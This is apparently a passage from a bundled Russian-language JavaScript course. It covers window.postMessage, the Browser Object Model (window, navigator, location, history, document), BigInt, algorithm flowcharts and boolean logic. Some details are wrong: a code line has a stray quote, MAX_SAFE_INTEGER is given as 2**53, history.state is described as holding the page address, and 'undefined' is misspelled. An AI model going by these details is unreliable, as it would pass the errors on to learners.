выведет его на страницу, указав при этом свое имя ( ~this.name~ ) имя окна, отправившего сообщение ( ~event.source.name~ )^^\n^^Кроме того, вкладка отправит сообщение в ответ с текстом \"_Wecome any time, my dear!_\"^^\n\n^^Нам осталось только отправить сообщение новой открытой нами вкладке:^^\n\n~~~js\nchildWin.postMessage('Hello, I\\'m listening to you', '*')\n~~~\n\n____________________________________________\n\n**Полный код примера**\n\n~~~js\nwindow.name = 'parentWin'\n\nwindow.onmessage = function (event) {\n  this.document.write(`<h3>${this.name}</h3><p>Message received</p><b><em>${event.data}</em></b>`)\n}\n\nlet childWin = window.open('about:blank', 'childWin')\n\nchildWin.onmessage = function (event) {\n  event.target.document.write(`<h3>${this.name}</h3><p>I've received the message from ${event.source.name}</p><b><em>${event.data}</em></b>`)\n  event.source.postMessage('Wecome any time, my dear!'', '*')\n}\n\nchildWin.postMessage('Hello, I\\'m listening to you', '*')\n~~~\n________________________________________________"},81342:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Browser Object Model (BOM)\n\n\nНа стороне клиента мы живем в браузере, а браузер живет в операционной системе.\n\n^^(Заметим, что мы можем жить не только в браузере, например, на стороне сервера мы можем жить в Node.js.)^^\n\nДавайте подумаем, как браузер представляет себя нам.\n\n@@@@\n\n![](images/user-see-ukr.png)\nКогда юзер открывает страницу в браузере, он видит пиксели.<br>Эти пиксели для него рендерит браузер.<br><br>Когда верстальщик создает страницу, он видит теги.<br>А браузер из этих тегов генерит пиксели для юзера.<br><br>Мы же видим браузер как объект **window**.<br>Потому что мы все видим как объекты.\n\n<br>Але, но браузер - не объект, а большое и сложное приложение!<br><br>Так что же мы видим?<br><br>Мы видим **модель браузера**, которую он создает специально для нас.<br>**Объектную модель**.\n![](images/users-see-pixels.png)\n\n@@@@\n\n_____________________________\n\n## ![ico-25 icon] Объект window\n\nМногие свойства объекта **window** являются ссылками на другие объекты, которые, в свою очередь, являются объектными моделями.\nРассмотрим, к примеру, объект **document**.\nВ объекте **window** есть одноименное свойство, содержащее ссылку на объект **document**.\nВерстальщик видит его как\n\n~~~html\n&lt;html>\n  ...\n&lt;/html>\n~~~\n\nЮзер увидит отрендеренную браузером страницу, т.е. пиксели.\n\nА мы с вами видим объект.\n\n@@@@\n\n<br><br>И мы имеем доступ к свойствам и методам этого объекта по ссылке.\n![](images/reference-lockpick-ukr.png)\n\n@@@@\n\n@@@@\n\n![](illustrations/heap-1.jpg)\nЛюбая переменная, объявленная с помощью ~var~, становится свойством объекта **window**.<br><br>Она уязвима, потому что она оказалась в \"куче\" (**heap**).\n\n@@@@\n\nКуча потому и куча, что все аппы, запущенные в браузере, сваливают туда свои переменные.\n\n^^Если произойдет конфликт имен, т.е. два разных аппа, запущенных в браузере, определят переменные с одинаковым именем, то значение этой переменной будет переопределено и один из аппов точно получит неприятный \"сюрприз\".^^\n\nКроме того, аналогичная история происходит с идентификаторами элементов. В объекте **window** автоматически появляется переменная с таким именем.\n\nЕсли в разметке у вас есть элементы с атрибутом **id**\n\n~~~html\n&lt;body>\n  <main id=\"main-page\">\n    <section id=\"commodities\">\n      <figure id=\"phone\"></figure>\n    </section>\n  </main>\n&lt;/body>\n~~~\n\nто с использованием BOM получить ссылку на нужный элемент очень просто\n\n~~~js\nwindow['main-page']    //  ► &lt;main id=\"main-page>...&lt;/main>\"\nwindow['commodities']  //  ► &lt;section id=\"commodities\">...&lt;/section>\nwindow['phone']        //  ► &lt;figure id=\"phone\">&lt;/figure>\n~~~\n\n________________________________________________\n\n**_viewport_** - часть окна браузера, где отображается веб-страница\n^^( без панелей и элементов управления самого браузера )^^\n\n^^^[Упражнение 1]\n\nОбъявите функцию **_~winResize()~_**, которая выводит в консоль текущие размеры ~viewport~\n\nИспользуйте свойства объекта ~window~:\n• **~window._innerWidth_~**\n• **~window._innerHeight_~**\n\nИзменяйте размер ~viewport~ и вызывайте функцию **_~winResize()~_**\n\n^^^\n\nК числу свойств объекта  **window** относятся следующие объекты:\n\n![ico-20 green-ok] console\n![ico-20 green-ok] navigator\n![ico-20 green-ok] screen\n![ico-20 green-ok] location\n![ico-20 green-ok] history\n![ico-20 green-ok] document\n\n^^Проверим это:^^\n\n◘◘![ico-20 cap] ** 1**◘◘\n\n~~~js\nvar props = [\n  'console',\n  'document',\n  'location',\n  'history',\n  'screen',\n  'navigator'\n]\n\nfor (var prop of props) console.log(window[prop])\n~~~\n\n^^**Результат в консоли:**^^\n\n~~~console\n\n► console {debug: ƒ, error: ƒ, info: ƒ, log: ƒ, warn: ƒ, …}\n► #document\n► Location {replace: ƒ, href: \"about:blank\", ancestorOrigins: DOMStringList, origin: \"null\", protocol: \"about:\", …}\n► History {length: 2, scrollRestoration: \"auto\", state: null}\n► Screen {availWidth: 1920, availHeight: 1040, width: 1920, height: 1080, colorDepth: 24, …}\n► Navigator {vendorSub: \"\", productSub: \"20030107\", vendor: \"Google Inc.\", maxTouchPoints: 0, hardwareConcurrency: 8, …}\n~~~\n\n\nУ каждого из этих объектов есть свои свойства и методы\n\n_____________________________________\n\n### ![ico-20 icon] navigator\n\n#### navigator.geolocation\n\n◘◘geolocation◘◘\n\n~~~console\n▼ Geolocation {}\n  ▼ __proto__: Geolocation\n      ► clearWatch: ƒ clearWatch()\n      ► getCurrentPosition: ƒ getCurrentPosition()\n      ► watchPosition: ƒ watchPosition()\n      ► constructor: ƒ Geolocation()\n        Symbol(Symbol.toStringTag): \"Geolocation\"\n      ► __proto__: Object\n~~~\n\nМетод **getCurrentPosition** имеет три формальных параметра\n\nПервый формальный параметр ( обязательный ) - это функция, которая будет вызвана в случае благополучного завершения операции\nОна получит в качестве аргумента объект следующей структуры:\n\n◘◘Position◘◘\n\n~~~console\n▼ Position {coords: Coordinates, timestamp: 1564355238231}\n  ▼ coords: Coordinates\n        accuracy: 30\n        altitude: null\n        altitudeAccuracy: null\n        heading: null\n        latitude: 50.0159007\n        longitude: 36.2216816\n        speed: null\n      ► __proto__: Coordinates\n    timestamp: 1564355238231\n  ► __proto__: Position\n~~~\n\nВторой формальный параметр (опциональный) - тоже функция, которая будет вызвана в случае неудачного завершения геолокации\n\nТретий (опциональный) формальный параметр - это объект опций запроса\n\n◘◘![ico-20 cap] ** 2**◘◘\n\n~~~js\nconst status = document.body\n  .appendChild(document.createElement('p'))\n\nif (!navigator.geolocation) {\n  status.textContent = 'Geolocation is not supported by your browser'\n} else {\n  status.textContent = 'Locating…'\n\n  navigator.geolocation.getCurrentPosition(position => {\n    const coord = [position.coords.latitude, position.coords.longitude]\n    status.textContent = `https://www.openstreetmap.org/#map=40/${coord[0]}/${coord[1]}`\n    window.open(`https://www.openstreetmap.org/#map=40/${coord[0]}/${coord[1]}`, '_blank')\n  }, () => status.textContent = 'Unable to retrieve your location')\n}\n~~~\n\n{{{BOM-geolocation.js}}}\n\n_____________________________________\n\n### ![ico-20 icon] console\n\nМетодами объекта  **~console~**  мы уже пользовались\n\n![](illustrations/console-methods.png)\n\n^^^[Упражнение 2]\n\n^^Выполните код в консоли:^^\n~~~js\nconsole.time('while')\n\nvar x = 10000\nwhile (x-- > 0) {}\n\nconsole.timeEnd('while')\n\nconsole.time('for')\n\nfor (var x = 0; x < 10000; x++) {}\n\nconsole.timeEnd('for')\n~~~\n\nЧто произошло ?\n\n^^^\n\n______________________________________\n\n### ![ico-20 icon] screen\n\n![](illustrations/screen-properties.png)\n______________________________________\n\n### ![ico-20 icon] location\n\n![](illustrations/location-properties.png)\n\n^^^[свойства объекта location]\n\n![ico-20 green-ok] hash\n![ico-20 green-ok] host\n![ico-20 green-ok] hostname\n![ico-20 green-ok] href\n![ico-20 green-ok] origin\n![ico-20 green-ok] pathname\n![ico-20 green-ok] port\n![ico-20 green-ok] protocol\n![ico-20 green-ok] search\n\n^^^\n\n^^^[Упражнение 3]\n\n^^Выполните код в консоли:^^\n~~~js\nvar win = window.open('https://css-tricks.com')\n~~~\n\n^^Откройте консоль новой вкладки^^\n^^Выполните код в консоли:^^\n~~~js\nconsole.clear()\n~~~\n\n^^Добавьте в конец адреса в адресной строке браузера: #777^^\n^^Нажмите _Enter_^^\n^^Выполните код в консоли:^^\n~~~js\nlocation.hash\n~~~\n\n^^Что вы видите в консоли?^^\n\n^^Вернитесь в исходную вкладку^^\n^^Выполните код в консоли:^^\n~~~js\nwin.close()\n~~~\n\nЧто произошло ?\n\n^^^\n\n^^^[Упражнение 4]\n\n^^Выполните код в консоли:^^\n~~~js\nvar win = window.open()\n~~~\n\n^^Откройте консоль новой вкладки^^\n^^Выполните код в консоли:^^\n~~~js\nlocation.href = 'https://translate.google.com'\n~~~\n\nЧто произошло?\n\n^^^\n______________________________________\n\n### ![ico-20 icon] history\n\nПосмотрим на объект **~history~** в консоли:\n\n~~~~console\n▼ history: History\n      length: 2\n      scrollRestoration: \"auto\"\n      state: null\n    ▼__proto__: History\n        ► back: ƒ back()\n        ► forward: ƒ forward()\n        ► go: ƒ go()\n          length: (...)\n        ► pushState: ƒ pushState()\n        ► replaceState: ƒ replaceState()\n          scrollRestoration: (...)\n          state: (...)\n        ► constructor: ƒ History()\n          Symbol(Symbol.toStringTag): \"History\"\n        ► get length: ƒ ()\n        ► get scrollRestoration: ƒ ()\n        ► set scrollRestoration: ƒ ()\n        ► get state: ƒ ()\n        ► __proto__: Object\n~~~~\n\n![ico-20 green-ok] Свойство **history._state_** (строка) содержит адрес текущей страницы\n\n![ico-20 green-ok] Свойство **history._length_** (целое число) содержит число переходов в истории текущей страницы ^^(на единицу больше, чем максимально возможное значение для метода **_go()_**)^^\n\n![ico-20 green-ok] С помощью методов **history._back()_** и **history._forward()_** можно управлять переходами назад / вперед по истории\n\n![ico-20 green-ok] С помощью метода **history._go()_** (^^если аргумент метода - целое число^^) можно перейти на заданное число страниц вперед (^^положительное значение аргумента^^) или назад (^^отрицательное значение аргумента^^)\n\n~~~js\nwindow.history.go(-2)\n~~~\n\n^^В HTML5 были введены методы **history._pushState()_** и **history._replaceState()_**, которые позволяют добавлять и изменять записи истории^^\n[MDN](external/mdi-history-api)\n\nОбратите внимание, что свойство **~history.&#95;&#95;proto&#95;&#95;~** является ссылкой на **~History()~**, а свойство **~history.&#95;&#95;proto&#95;&#95;.&#95;&#95;proto&#95;&#95;~** является ссылкой на  **~Object~**\n\n___________________________________________\n\n### ![ico-20 icon] document\n\n^^^[Упражнение 5]\n\n^^Выполните код в консоли:^^\n\n~~~js\nvar newWin = window.open()\nnewWin.document.write('<h1>Я  - программист</h1>')\nnewWin.document.write('<script>document.write(\\'<h3>Hello!</h3>\\')<\/script>')\nconsole.log(newWin.document.body)\n~~~\n\nЧто произошло ?\n\n^^^\n\n^^^[Упражнение 6]\n\n^^Выполните код в консоли:^^\n\n~~~js\nvar newWin = window.open()\nnewWin.document.write('<h1>Я  - программист</h1>')\nnewWin.document.write('<script>document.write(\\'<h3>Hello!</h3>\\')<\/script>')\nconsole.log(newWin.document.body)\nnewWin.close()\n~~~\n\nЧто произошло ?\n\n^^^\n\n^^^[Упражнение 7]\n\n^^Выполните код в консоли:^^\n\n~~~js\nvar html = `\n  <style>\n    h3 {\n      font-family: Arial;\n      color: #f50;\n    }\n  </style>\n  <script>\n    document.write('<h3>Hello!</h3>')\n  <\/script>\n`\n\nvar newWin = window.open('https://www.w3schools.com/')\nnewWin.document.write(html)\n~~~\n\nЧто произошло?\n\n^^^\n\n_________________________________________________________\n\n[![ico-30 hw] Упражнения](test/bom)\n"},15185:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="## ![ico-25 icon] BigInt\n\n**ES10 (2019)**\n\n**~BigInt~** - новый тип данных (числа произвольной точности)\n\nРанее максимально возможным числом было **~Number.MAX_SAFE_INTEGER~** (2**53, или ~9007199254740992~)\n\nТеперь это ограничение снято\n\n__________________________________________________________\n\n### ![ico-20 icon] Создание BigInt\n\nДля создания числа типа **~BigInt~** нужно просто добавить **~ n ~**:\n\n~~~js\nvar bigNumber = 78n\n~~~\n\nили использовать конструктор нового типа данных:\n\n~~~js\nvar bigNumber = Number.MAX_SAFE_INTEGER + 5003  // 9007199254745994\nbigNumber = BigInt(bigNumber) // 9007199254745994n\n~~~\n\nТеперь оператор **~typeof~** будет возвращать новый тип данных:\n\n~~~js\ntypeof bigNumber // 'bigint'\n~~~\n\n_____________________________________________________________\n\n### ![ico-20 icon] Приведение типов\n\n**~NaN~**, **~null~**, **~Infinity~** не могут быть конвертированы в **~bigint~**\n\n#### Infinity\n\n~~~js\nBigInt(Infinity)\n~~~\n\nбудет сгенерировано исключение **RangeError**\n\n![ico-20 err]\n\n~~~error\n    Uncaught RangeError: The number Infinity cannot be converted to a BigInt because it is not an integer\n~~~\n\n#### NaN\n\n~~~js\nBigInt(NaN)\n~~~\n\nбудет сгенерировано исключение **RangeError**\n\n![ico-20 err]\n\n~~~error\n    Uncaught RangeError: The number NaN cannot be converted to a BigInt because it is not an integer\n~~~\n\n#### null\n\n~~~js\nBigInt(null)\n~~~\n\nбудет сгенерировано исключение **TypeError**\n\n![ico-20 err]\n\n~~~error\n    Uncaught TypeError: Cannot convert null to a BigInt\n~~~\n\n_____________________________________________________\n\n#### Boolean → BigInt\n\n~~~js\nBigInt(false)  // 0n\nBigInt(true)   // 1n\n~~~\n\n#### [] → BigInt\n\n~~~js\nBigInt([])   // 0n\n~~~\n\n#### String → BigInt\n\n~~~js\nBigInt('45')        // 45n\nBigInt('45' + 11)   // 4511n\nBigInt('45' - 11)   // 34n\n\nBigInt('45' - true) // 44n\n~~~\n\nа вот такое приведение:\n\n~~~js\nBigInt('45 + 8')\n~~~\n\n![ico-20 err]\n\n~~~error\n    Uncaught SyntaxError: Cannot convert 45 + 8 to a BigInt\n~~~\n\n_____________________________________________________________\n\n### ![ico-20 icon] Арифметические операции\n\n^^^[Арифметические операции]\n\nАрифметические операции с участием данных типа **~bigint~** возможны только при условии, что оба операнда имеют тип данных **~bigint~**\n\nПри попытке выполнить арифметическую операцию с операндами различного типа\n\n~~~js\nbigNumber * 2\n~~~\n\nбудет сгенерировано исключение\n\n![ico-20 err]\n\n~~~error\n    Uncaught TypeError: Cannot mix BigInt and other types, use explicit conversions\n~~~\n\nПри попытке применить функции библиотеки Math к данным типа **~bigint~**\n\n~~~js\nMath.sin(bigNumber)\n~~~\n\nбудет сгенерировано исключение\n\n![ico-20 err]\n\n~~~error\n    Uncaught TypeError: Cannot convert a BigInt value to a number\n~~~\n\nОднако можно привести данное типа **~bigint~** к обычному типу **~number~**\n\n~~~js\nNumber(bigNumber) // 9007199254745994\n~~~\n\nПри приведении к строке оба типа (**~bigint~** и **~number~**) будут возвращать одинаковый результат:\n\n~~~js\nbigNumber = bigNumber * bigNumber // 81129638414696789717133459048036n\nbigNumber.toString() // \"81129638414696789717133459048036\"\n\nNumber(bigNumber) // 8.112963841469679e+31\nbigNumber.toString() // \"81129638414696789717133459048036\"\n~~~\n\nДанные типа **~bigint~** можно использовать в качестве индексов элементов массива:\n\n~~~js\nlet bigArray = [\n  BigInt(Number.MAX_SAFE_INTEGER + 2),\n  BigInt(Number.MAX_SAFE_INTEGER + 3),\n  BigInt(Number.MAX_SAFE_INTEGER + 4),\n  BigInt(Number.MAX_SAFE_INTEGER + 5)\n]\n\nbigArray[BigInt(1)]  // 9007199254740994n\n~~~\n\n^^^\n\n____________________________________________________________\n\n### ![ico-20 icon] Битовые операции\n\nБитовые операции работают с данными типа **~bigint~** и возвращают результат типа **~bigint~**:\n\n~~~js\nbigArray[0] ^ bigArray[1]  // 2n\n\nbigArray[0] | bigArray[1]  // 9007199254740994n\n\n~~~\n"},8485:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 icon] Блок схема алгоритма\n\n______________________________________________________________________\n\n## ![ico-25 icon] Алгоритм\n\nВ основе структурного программирования лежит триада:\n\n• **Последовательность** - выполнение действий одно за другим.\n• **Ветвление** - выбор действия в зависимости от выполнения условия.\n• **Цикл** - неоднократное повторение одной и той же последовательности действий.\n\n\nПрограммирование начинается с _описания алгоритма_.\n\n**Алгоритм** - это пошаговая система инструкций, определяющих процесс перехода от исходных данных (на входе) к искомому результату (на выходе).\n\n| **~ВХОД~** | ** ➔** | **~Процесс~** | ** ➔** | **~ВЫХОД~** |\n\nЕсли результат существует, алгоритм выполняется за конечное число шагов.\n\nЕсли искомого результата не существует, алгоритм или никогда не завершает работу, либо заходит в тупик.\n\nИногда алгорим достаточно прост, и вы его держите в уме, когда пилите скрипт.\n\nНо иногда он бывает настолько сложным, что вы хотите визуализировать его, чтобы ничего не забыть и не перепутать.\n\nОдним из способов описания алгоритма является **блок-схема**.\n\n\n________________________________________________________________________________\n\n## ![ico-25 icon] Блок-схема\n\nБлок-схемы являются незаменимыми инструментами для визуализации сложных процессов.\n\nДля того, чтобы какой-то процесс изобразить схематически, нам нужны определенные графические формы.\n\nПростейшими из таких форм являются:\n\n@@@@ 1\n![](illustrations/flowchart-symbols.svg)\n@@@@\n\nАлгоритм должен иметь начало и конец.\n\nПереход от одного действия к другому изображается стрелками.\n\nБлок операций - прямоугольник - позволяет вам использовать различный уровень детализации. В один такой блок можно вписать сразу целую последовательность простых действий, а можно каждое такое простое действие поместить в отдельный блок.\n\n<div class="flowchart-endpoints">Begin<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Взять штаны<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Почистить штаны<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Пришить пуговицу<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Погладить штаны<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-process">Надеть штаны<div>\n<div class="flowchart-arrow">↓</div>\n<div class="flowchart-endpoints">End<div>\n\n_______________________________________________________\n\nКаждый из блоков "Почистить штаны" или "Пришить пуговицу" можно развернуть в отдельную последовательность действий.\n\nМожно переставить местами блоки "Почистить штаны" и "Пришить пуговицу", однако точно не стоит менять положение блока "Надеть штаны", поскольку в этом случае все остальные операции значительно усложнятся.\n\n_______________________________________________________\n\n^^Для рисования блок-схемы можно воспользоваться^^ [^^**бесплатным сервисом**^^ ![ico-25 draw-io]](https://www.draw.io/)\n\n_______________________________________________________\n\n### ![ico-20 icon] Последовательность\n\nВозможно, вы не отдаете себе в этом отчет, но вся ваша жизнь - это процесс, который заключается в определенной последовательности действий.\n\nУтром вы встаете, затем идете в ванную комнату, потом (скорее всего) - на кухню, где готовите себе кофе, и т.д.\n\nПеред выходом на работу вы одеваетесь.\n\nНаверное, было бы странно, если бы вы вышли на улицу прямо из душа. Хотя всякое случается ![ico-25 wink].\n\nТ.е. если в вашей последовательности действий убрать какое-то звено, или переставить местами две отдельных операции, то результат может быть очень неприятным.\n\nПредположим, вы делаете себе чай, пьете его, и только потом накладываете в чашку сахар. Думаю, вы пили несладкий чай. Добавление сахара после чаепития ситуацию явно не исправит.\n\nИтак, последовательность действий очень важна.\n\nКогда вы пишете программу, вы задаете компьютеру четкую последовательность действий.\n\nЭту последовательность можно изобразить схематично в виде блок-схемы:\n\n\n@@@@ 1\n![](illustrations/flowchart-sequence.svg)\n@@@@\n\nКак видите, строго соблюдается направление сверху вниз.\nТолько после завершения предыдущего действия начинается следующее.\n\n_______________________________________________________\n\n### ![ico-20 icon] Ветвление\n\nОчень часто мы вынуждены принимать решение, что делать.\nЕсли вам задерживают выплату зарплаты, вы не можете сделать запланированную покупку.\nПолучение зарплаты - условие, если оно выполнено - вы можете покупать то, что запланировали.\n\nВаш код будет оперировать данными, которое динамично меняются.\nВ зависимости от значения каких-то данных ваш код будет выполнять различные операции.\nНапример, юзер открыл ваше приложение.\nОн мог зарегистрироваться, авторизоваться или войти как незарегистрированный пользователь.\nЕсли это зарегистрированый пользователь, то он может войти в персональный кабинет.\nВ противном случае такой возможности у него нет.\n\n@@@@ 1\n![](illustrations/flowchart-branching.svg)\n@@@@\n\n_______________________________________________________\n\n### ![ico-20 icon] Цикл\n\nПовторение одной и той же последовательности действий несколько раз - это цикл.\n\nМытье посуды вручную - это цикл (тарелка за тарелкой, чашка за чашкой - пока вся посуда не будет вымыта).\n\nХодьба - это цикл: поднимается левая нога, выносится вперед, опускается, вы переносите вес тела на левую ногу и поднимаете правую, которая так же выносится вперед и опускается, и так до тех пор, пока вы не придете в точку назначения или вам не надоест выполнять эти упражнения.\n\nНа блок-схеме алгоритма цикл будет выглядеть примерно так:\n\n@@@@ 1\n![](illustrations/flowchart-circle.svg)\n@@@@\n\nКак видите, есть некое условие, выполнение которого проверяется на каждой **итерации** цикла.\nТ.е. если бы мы не использовали выше рассмотренное **ветвление**, то цикл крутился бы бесконечно, что абсолютно недопустимо.\n\n_______________________________________________________\n\n\n![ico-20 hw] **Упражнение 1**\n\n^^Нарисуйте блок-схему алгоритма суммирования всех целых чисел от 1 до N^^\n\n![ico-20 hw] **Упражнение 2**\n\n^^Нарисуйте блок-схему алгоритма суммирования всех целых нечетных чисел от 1 до N^^\n\n__________________________________________________________________\n\n### ![ico-25 cap] Ряд Фибоначчи\n\n^^Ряд Фибоначчи - это последовательность чисел, каждое из которых равно сумме двух предыдущих.^^\n\n^^Первый и второй члены ряда Фибоначчи равны 1.^^\n\n**Схема алгоритма вычисления члена ряда Фибоначчи по его номеру ~ N ~**\n\n@@@@ 1\n![](illustrations/flowchart-fibonachi.svg)\n@@@@\n\n_______________________________________________________\n\n![ico-20 hw] **Упражнение 3**\n\n^^Измените блок-схему алгоритма вычисления члена ряда Фибоначчи по его номеру ** N ** следующим образом:^^\n\n^^• измените стартовые значения переменных^^\n^^• перенесите инкремент (приращение) переменной ** n ** перед блоком ветвления кода (где сравниваются ** n ** и ** N **)^^\n\n~~~js\n  n = 1\n  a = 1\n  b = 1\n  F = 1   \n  n = n + 1\n  ...\n~~~\n\n_______________________________________________________\n\n![ico-20 hw] **Упражнение 4**\n\n^^Нарисуйте блок-схему алгоритма вычисления факториала числа N.^^\n\n^^**Факториал** числа N - это произведение всех чисел от 1 до N.^^\n\n~~~js\nN! = 1 * 2 * 3 * 4 * .... * N\n~~~\n'},53912:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-35 study] Логические конструкции языка\n\nВ это разделе мы познакомимся с логическими значениями, логическими переменными, логическими выражениями и логическими операторами.\n\n## ![ico-30 icon] Переменные логического типа (boolean)\n\nКогда человек заявляет, что его сыну 18 лет, то это выражение будет правдой в течение одного года, а до этого года и после этого года это выражение станет ложью. И то при условии, что у этого человека есть сын.\n\n![](illustrations/logical-expressions.svg)\n\nПредположим, что это утверждение человек написал на своей странице в социальных сетях, когда ему было 15 лет.\nУ него еще не было сына, и это утверждение было ложью.\nПотом он повзрослел, женился и у него родился сын, но это утверждение оставалось ложью, потому что его сыну еще не было 18 лет.\nНаконец, когда его сыну исполнилось 18, это утверждение стало истиной.\nНо это продолжалось один год.\nПотом его сыну исполнилось 19, и это утвеждение опять стало ложным.\n\nТаким образом, это утверждение является **переменной**. Ведь его значение может меняться.\nЗначения, которые может принимать эта переменная - \"истина\" (**~true~**) или \"ложь\" (**~false~**).\n**~true~** и **~false~** - это **логические значения**.\n\n![ico-25 warn] **Других логических значений не существует.**\n^^У нас нет такого лукавого значения, как \"Не все так однозначно\". Все однозначно. Или черное, или белое. Наш мир прост.^^\n\nИтак, наша переменная может принимать одно из двух возможных логических значений (**~true~** или **~false~**).\nЭто переменная **логического типа** (**~boolean~**).\n\n______________________________________\n\n## ![ico-30 icon] Логические выражения\n\nУтверждение \"_Яблоко красное и круглое_\" можно разложить на две части: \"_Яблоко красное_\" + \"_Яблоко круглое_\".\n\n![](illustrations/logical-expressions-1.svg)\n\nТ.е. фактически мы имеем дело с двумя логическими переменными, каждая из которых принимает логическое значение, т.е. является переменной логического типа.\n\n◘◘ ![ico-25 coffee] ** 1**◘◘\n~~~js\nvar apple = {\n  color: 'yellow',\n  shape: 'square'\n}\n~~~\n\nПусть логическая переменная **~appleIsRed~** принимает значение **~true~**, когда свойство **~apple.color~** имеет значение 'red', а логическая переменная **~appleIsRound~** принимает значение **~true~**, когда свойство **~apple.shape~** имеет значение 'round'.\n\nПеременная **~appleIsRedAndRound~** принимает значение **~true~**, когда свойство **~apple.color~** имеет значение 'red', а свойство **~apple.shape~** имеет значение 'round'.\n\n| apple.color | apple.shape | appleIsRed | appleIsRound | appleIsRedAndRound |\n|   'red'     |   'round'   |   ~true~   | ~true~       |   ~true~           |\n|   'yellow'  |   'round'   |   ~false~  | ~true~       |   ~false~          |\n|   'red'     |   'square'  |   ~true~   | ~false~      |   ~false~          |\n|   'green'   |   'square'  |   ~false~  | ~false~      |   ~false~          |\n\nТогда переменная **~appleIsRedAndRound~** уже является **логическим выражением**, поскольку требует вычисления ее значения на основе значений переменных **~appleIsRed~** и **~appleIsRound~**.\n\nИ это логическое выражение будет иметь значение **~true~** только тогда, когда обе переменные **~appleIsRed~** и **~appleIsRound~** будут иметь значение **~true~**.\n\n**Логическое выражение** - это выражение, в результате вычисления которого будет получено логическое значение.\n\nПростейшим случаем логического выражения является логическое значение.\n\nДавайте посмотрим, как можно построить более сложные логические выражения.\n\n_________________________________________________________________________\n\n### ![ico-25 icon] Операторы сравнения\n\nСамый простой способ построения логических выражений - это использование **операторов сравнения**.\nЭто бинарные операторы, т.е. они имеют два операнда.\nОперанды могут быть переменными или выражениями.\n![ico-25 warn] Операторы сравнения сравнивают не только **значения**, но и **типы данных** операндов.\nОператоры сравнения всегда возвращают **логическое значение**.\n\n| Оператор | Описание |\n| **~==~** | нестрогое равенство ^^(сравниваются только значения операндов, под капотом происходит приведение типов данных)^^ |\n| **~===~** | строгое равенство ^^(сравниваются типы данных операндов, и если тип данных операндов один и тот же, то сравниваются значения операндов)^^ |\n| **~!=~** | нестрогое неравенство ^^(значения не равны, тип данных игнорируется)^^ |\n| **~!==~** | строгое неравенство ^^(не равны не только  значения, но и типы данных)^^ |\n| **~ > ~** | больше |\n| **~ < ~** | меньше |\n| **~>=~** | больше или равно |\n| **~<=~** | меньше или равно |\n\nСравнение строк происходит посимвольно.\nКаждый символ имеет числовой код, и сравниваются коды символов.\nЕсли первые символы строк-операндов равны, то сравниваются следующие символы, и так до тех пор, пока один из сиволов не окажется больше или меньше второго.\n\n§§§§ Demo | boolean_01_template §§§§\n\n_________________________________________________________________________\n\n### ![ico-30 hw] Тесты\n\n◘◘![ico-25 hw]** 1**◘◘\n\n→→→ 5 > '4' | true, false | true→→→\n\n◘◘![ico-25 hw]** 2**◘◘\n\n→→→ 5 !== '5' | true, false | true→→→\n\n◘◘![ico-25 hw]** 3**◘◘\n\n→→→ 10 != '10' | true, false | false→→→\n\n◘◘![ico-25 hw]** 4**◘◘\n\n→→→ true != 1 | true, false | false→→→\n\n◘◘![ico-25 hw]** 5**◘◘\n\n→→→ true !== '1' | true, false, 'Не все так однозначно' | true→→→\n\n◘◘![ico-25 hw]** 6**◘◘\n\n→→→ true <= 1 | true, false | true→→→\n\n◘◘![ico-25 hw]** 7**◘◘\n\n→→→ 'abc' < 'cde' | true, false | true→→→\n\n◘◘![ico-25 hw]** 8**◘◘\n\n→→→ 'Welcome!'.length < 'How are you?'.length | true, false | true→→→\n\n__________________________________________________________________________\n\n## ![ico-30 icon] Логические операторы\n\nЛогических операторов в JS три: **логическое умножение**, **логическое сложение** и **логическое отрицание**.\n\nОператор **логического отрицания** - это унарный оператор, т.е. он имеет всего один операнд.\nЛогические операторы \"и\" и \"или\" - это бинарные операторы, у них два операнда.\n\nЛогическое отрицание всегда возвращает логическое значение, даже если операнд не является логическим выражением (или логическим значением).\nОператоры **логического умножения**, **логического сложения** не всегда возвращают логическое значение.\n\nПри выполнении логических операций под капотом движок приводит операнды к типу данных **~boolean~**.\nЭто называется [►►►**неявное приведение типов**►►►](page/Implicit-type-conversion).\n\nПоскольку приведение к типу **~boolean~** является достаточно простым, мы можем немного \"забежать вперед\":\n\n1. Пустая строка приводится к **~false~**. Если длина строки больше 0, то такая строка будет приведена к **~true~** независимо от того, какие символы есть в этой строке.\n2. Числа, отличные от 0 и **~NaN~**, приводятся к **~true~**, а 0 и **~NaN~** приводятся к **~false~**.\n3. **~null~** и **~undefib=ned~** приводятся к **~false~**.\n4. Любые структуры данных (массивы, объекты) всегда приводятся к **~true~**, независимо от содержимого этих структур данных или полного отсутствия содержимого.\n\n_____________________________________________\n\n### ![ico-25 icon] Оператор отрицания\n\nУтверждение \"Яблоко не красное\" является отрицанием утверждения \"Яблоко красное\".\nТ.е. яблоко может быть любого цвета, только не красного.\nЕсли вернуться к примеру 1:\n\n~~~js\nvar apple = {\n  color: 'yellow',\n  shape: 'square'\n}\n\nvar appleIsRed = apple.color === 'red'\nvar appleIsRound = apple.shape === 'round'\n~~~\n\nто новая переменная логического типа **~appleIsNotRed~** может быть вычислена на основании значения переменной **~appleIsRed~** путем отрицания.\n\nДля логического отрицания в JS используется символ **~ !~** (восклицательный знак):\n\n~~~js\nvar appleIsNotRed = !appleIsRed\n~~~\n\n![ico-25 warn] Логическое отрицание всегда возвращает **логическое значение** независимо от типа данных операнда.\nТ.е. каким бы ни был тип данных операнда, оператор **~ !~** всегда вернет логическое значение **~true~** или **~false~**.\n\n◘◘![ico-25 coffee] ** 2**◘◘\n\n~~~js\n!(5 > 8)    // true\n\n// explanation:\n\n5 > 8      // false,\n!false     // true\n~~~\n\n◘◘![ico-25 coffee] ** 3**◘◘\n\n~~~js\n!(5 > 4)   // false\n\n// explanation:\n\n5 > 4      // true,\n!true      // false\n~~~\n\n§§§§ Demo | boolean_02_template §§§§\n\n____________________________________________________________\n\n### ![ico-25 icon] Логическое умножение\n\nСинтаксис: ~operand1 